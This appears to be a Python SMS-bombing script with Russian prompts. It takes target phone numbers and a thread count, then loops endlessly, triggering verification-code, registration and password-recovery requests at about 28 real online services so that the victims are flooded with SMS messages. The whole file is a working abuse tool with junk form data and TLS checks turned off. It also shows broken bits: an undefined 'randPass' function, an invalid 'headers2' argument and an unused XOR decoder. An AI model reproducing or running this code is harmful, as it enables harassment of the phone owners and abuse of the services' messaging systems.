import requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from threading import Thread

def pars(T_, ForS, _T):
    if T_ == '' or ForS == '' or _T == '':
        return
    else:
        res = ForS.split(T_, 1)[1].split(_T)[0]
        return res 


headers1 = {'Content-Type':'application/json',  'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 YaBrowser/19.3.0.3022 Yowser/2.5 Safari/537.36', 
 'Accept':'*/*', 
 'Accept-Language':'ru,en;q=0.9,de;q=0.8'}
headers2 = {'Content-Type':'application/x-www-form-urlencoded', 
 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 YaBrowser/19.3.0.3022 Yowser/2.5 Safari/537.36', 
 'Accept':'*/*', 
 'Accept-Language':'ru,en;q=0.9,de;q=0.8'}

def decodeXor(cypherString, key):
    plainText = ''
    cypherArray = []
    i = 0
    for i in range(0, len(cypherString), 2):
        cypherArray.append(cypherString[i] + cypherString[i + 1])

    for i in range(0, len(cypherArray), 1):
        hex = cypherArray[i]
        dec = int(hex, 16)
        keyPointer = i % len(key)
        asciiCode = dec ^ ord(key[keyPointer])
        plainText += chr(asciiCode)

    return plainText

count_of_numbers = 0
while count_of_numbers <= 0:
    count_of_numbers = int(input('Число номеров: '))

phoneList = []
for i in range(1, count_of_numbers + 1, 1):
    phoneList.append(input('Введите номер телефона №' + str(i) + ': '))

need_threads = 0
while need_threads < len(phoneList):
    try:
        need_threads = int(input('Потоки: '))
    except:
        print('!  -   1  ')

timeout = 0
while timeout <= 0:
    try:
        timeout = int(input(' TimeOut ( стандартное значение 5): '))
    except:
        print('!  timeout  1   ')

Num_of_phone = -1
Num_of_thread = -1
print('Работа началась! Лог покажется после прохождения цикла.')

def My_Thread():
    Good = 0
    Bad = 0
    Errors = 0
    num_thr = Num_of_thread
    phone = phoneList[Num_of_phone]
    phn = '+' + phone[0:1] + ' (' + phone[1:4] + ') ' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
    phn1 = phone[1:11]
    phn2 = phone[0:1] + ' (' + phone[1:4] + ') ' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
    phn3 = phone[0:1] + '%2B(' + phone[1:4] + ')%2B' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
    while True:
        try:
            decoded = "https://eda.yandex/api/v1/user/request_authentication_code"
            Service1 = requests.post(decoded, json={'phone_number': phn1}, headers=headers1, verify=False, timeout=timeout)
            if '{"delay"' in Service1.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://krasnoeibeloe.ru/local/php_interface/ajax/"
            Service2 = requests.post(decoded, data={'ajax_command':'confirm_phone',  'phone':phone}, verify=False, timeout=timeout, headers2=headers2)
            if 'success' in Service2.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://driver.gett.ru/api/login/phone/"
            Service3 = requests.get(decoded, verify=False)
            token = pars('csrftoken=', str(Service3.cookies), ' ')
            Service3 = requests.post(decoded, timeout=timeout, json={'phone':phn,  'registration':True}, headers={'Content-Type':'application/json',  'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 YaBrowser/19.3.0.3022 Yowser/2.5 Safari/537.36',  'Accept':'*/*',  'Accept-Language':'ru,en;q=0.9,de;q=0.8',  'X-CSRFToken':token,  'Referer':'https://driver.gett.ru/signup/',  'Accept-Encoding':'gzip, deflate, br',  'Cookie':'csrftoken=' + token}, verify=False)
            if '"success":true' in Service3.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://vip.azartplay10.ru/api/register.json"
            Service4 = requests.post(decoded, timeout=timeout, verify=False, data={'formCodeName':'gAuthorizationByPhone',  'submit':'',  'phone':'+' + phone})
            if '{"success":true,"message":"","responseId":"","guestauth2":true,"code":0}' in Service4.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://www.ding.com/ru/PhoneLogin/OwnedPhoneNumber?nonce="
            Service5 = requests.get('https://www.ding.com/ru/register?phoneRegister=true', timeout=timeout, verify=False)
            token = pars('phoneNumberNonce = "', Service5.text, '"')
            Service5 = requests.post(decoded + token, timeout=timeout, json={'phoneNumber':phone,  'countryDial':None,  'viaCall':False}, allow_redirects=False, verify=False)
            if 'Error":false,"ErrorType"' in Service5.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://www.finam.ru/scripts/smslocker/SMSLockerClient.asp?action=send&guid="
            s = requests.session()
            token = s.get('https://www.finam.ru/investor/istart00026/body.asp', verify=False, timeout=timeout)
            token = pars('phone-guid" value="', token.text, '"')
            Service6 = s.get(decoded + token + '&phone=%2B' + phone + '&mode=json', timeout=timeout, verify=False)
            if '{ "smslocker": { "result": true' in Service6.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru"
            Service7 = requests.post(decoded, timeout=timeout, headers=headers1, json={'phone_number': phone}, verify=False)
            if 'sms_sent":true' in Service7.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://dodopizza.ru/api/sendconfirmationcode"
            Service8 = requests.post(decoded, timeout=timeout, data={'phoneNumber': phone}, verify=False)
            if 'resendTimeout' in Service8.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://p.grabtaxi.com/api/passenger/v2/profiles/register"
            Service9 = requests.post(decoded, timeout=timeout, json={'phoneNumber':phone,  'countryCode':'ID',  'name':'test',  'email':'mail@mail.com',  'deviceToken':'*'}, headers=headers1, verify=False)
            if '{"phoneNumber":"' in Service9.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://api.sunlight.net/v3/customers/authorization/"
            Service10 = requests.post(decoded, timeout=timeout, json={'phone': phone}, headers=headers1, verify=False)
            if 'success":"1"' in Service10.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://www.delivery-club.ru/ajax/user_otp"
            Service11 = requests.get('https://www.delivery-club.ru', verify=False, timeout=timeout)
            token = pars('csrf-token" content="', Service11.text, '"')
            Service11 = requests.post(decoded, timeout=timeout, headers={'X-CSRF-Token': token}, verify=False, data={'phone': phone})
            if 'payload":{"request_i' in Service11.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://b.utair.ru/api/v1/login/"
            Service12 = requests.post(decoded, timeout=timeout, verify=False, json={'login': phone})
            if '{"attempt_id":"' in Service12.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://personal.fizkult-nn.ru/profile/register"
            Service13 = requests.post(decoded, timeout=timeout, verify=False, data={'ret':'',  'anchor':'',  'lastName':'sdasdds',  'firstName':'dfdsasdas',  'secondName':'fdsdf',  'phone':phone,  'email':'vsbo3ne@yandex.ru',  'birthday':'30.01.1996',  'gender':'m',  'rules':'on'})
            if 200 == Service13.status_code:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://my.5ka.ru/api/v1/services/phones/add"
            token = requests.post('https://my.5ka.ru/api/v1/startup/handshake', timeout=timeout, json={'version':'1',  'app':{'version':'1',  'platform':'web',  'user_agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 YaBrowser/19.1.2.258 Yowser/2.5 Safari/537.36'}}, verify=False)
            token = pars('token":{"value":"', token.text, '"')
            Service14 = requests.post(decoded, timeout=timeout, json={'number': '+' + phone}, headers={'X-Authorization': 'Token' + token}, verify=False)
            if 'confirm_attempts' in Service14.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://ag.mos.ru/user/recoveryPassword"
            token = requests.get('https://ag.mos.ru', verify=False, timeout=timeout)
            token = pars('div style="display:none"><input type="hidden" value="', token.text, '"')
            Service15 = requests.post(decoded, timeout=timeout, data={'YII_CSRF_TOKEN':token,  'PhoneForm[phone]':phone}, verify=False)
            if '{"success":true}' in Service15.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://youla.ru/web-api/auth/request_code"
            Service16 = requests.post(decoded, timeout=timeout, verify=False, data={'phone': phone})
            if 'phone":"' in Service16.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://ioptima.ru/ajax/personal/popup_registration.php"
            Service17 = requests.get(decoded + phn3, timeout=timeout, verify=False)
            if '"SMS":{"CODE":"' in Service17.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://store.fitnesshouse.ru/assets/snippets/web_users/response.php?action=signupbtn"
            s = requests.session()
            token = s.get('https://crex.tech/register', timeout=timeout, verify=False)
            token = pars('csrf-token" content="', token.text, '"')
            Service18 = requests.post(decoded, timeout=timeout, verify=False, data={'_token':token,  'forgot':'false',  'phone':phone})
            if '<h4 class="bottom_space_2 notify1">' in Service18.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "http://93.120.235.78/api/v1/auth/register"
            Service19 = requests.post(decoded, timeout=timeout, verify=False, json={'phone': '+' + phone})
            if 'Sms notification was sent' in Service19.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://smart.space/api/users/request_confirmation_code/"
            Service20 = requests.post(decoded, timeout=timeout, verify=False, json={'mobile':'+' + phone,  'action':'confirm_mobile'})
            if 204 == Service20.status_code:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://splus.ru/crm/send_sms/?tel="
            Service21 = requests.get(decoded + phone, timeout=timeout, verify=False)
            if '{"status":1,"phone"' in Service21.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://login.mos.ru/sps/recovery/request"
            s = requests.session()
            token = (s.get('https://kari.com/ru/review/2257174/', verify=False, timeout=timeout)).text
            token = pars("bitrix_sessid':'", token, "'")
            Service22 = s.post(decoded, timeout=timeout, data={'CONFIRM':'Y',  'PHONE':phone,  'SESSID':token,  'MINDBOX_SUBSCRIBE':'Y'}, verify=False)
            if '{"success":true,"message":"codeSent"' in Service22.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "http://www.taxi-sms.ru/verification.php?phone="
            Service23 = requests.get(decoded + phn1, timeout=timeout, verify=False)
            if '{"error":0,"success":1}' in Service23.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://www.vianor-tyres.ru/register/check/"
            Service24 = requests.post(decoded, timeout=timeout, verify=False, data={'register_phone':phn,  'register_lastname':randPass(10),  'register_firstname':randPass(10),  'register_email':randPass(10) + '@yandex.ru',  'register_password':randPass(20)})
            if '<input class="form-control" type="tel" name="register_sms" id="id_register_sms' in Service24.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://pizzahut.ru/register"
            token = requests.get('https://pizzahut.ru', timeout=timeout, verify=False)
            token = pars('_csrfToken = "', token.text, '"')
            Service25 = requests.post(decoded, timeout=timeout, verify=False, data={'gender':'male',  'first_name':'sfdfsdf',  'dob-day':30,  'dob-month':1,  'dob-year':1996,  'britnday':'30.01.1996',  'email':'vsbone312@yandex.ru',  'password':'Qwerty1234',  'invitation_number':'',  'phone':phone,  'sign_mail':1,  'sign_loyalty':1,  'sign_terms':1,  '_token':token})
            if '"success":true' in Service25.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://paysend.com/registration.action"
            s = requests.session()
            token = s.get('https://paysend.com/registration', verify=False)
            token = pars('hidden" name="_csrf" value="', token.text, '"')
            Service26 = s.post(decoded, timeout=timeout, data={'name':'sdfsdfsdf',  'surname':'dsfsdfs',  'phone':phn1,  'password':'Qwerty12345',  'token':token}, verify=False, headers=headers2)
            if '"success":true' in Service26.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://friendsclub.ru/assets/components/pl/connector.php"
            Service27 = requests.post(decoded, timeout=timeout, verify=False, data={'phone': phone})
            if '"result":true,' in Service27.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        try:
            decoded = "https://api.chef.yandex/api/v2/auth/sms"
            Service28 = requests.post(decoded, data='{"phone":"' + phn1 + '"}', timeout=timeout, verify=False, headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 YaBrowser/19.3.1.887 Yowser/2.5 Safari/537.36',  'source':'web',  'Content-Type':'application/json;charset=UTF-8',  'Referer':'https://chef.yandex/login',  'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'ru,en;q=0.9,de;q=0.8',  'Accept':'application/json, text/plain, */*'})
            if '{"token":"' in Service28.text:
                Good += 1
            else:
                Bad += 1
        except:
            Errors += 1

        def Ressults():
            import datetime
            now = datetime.datetime.now()
            print('[' + phone + ']' + '--- No ' + str(num_thr + 1) + '---' + '[' + now.strftime('%H:%M:%S') + ']')
            print('Отправленно: ' + str(Good))
            print('Ошибок: ' + str(Bad))
            print('Не отправленно: ' + str(Errors))
            print('[' + phone + ']' + '--- No ' + str(num_thr + 1) + '---' + '[' + now.strftime('%H:%M:%S') + ']')

        Ressults()


for i in range(0, need_threads, 1):
    Num_of_thread += 1
    Num_of_phone += 1
    if Num_of_phone > count_of_numbers - 1:
        Num_of_phone = 0
    Potok = Thread(target=My_Thread)
    Potok.start()
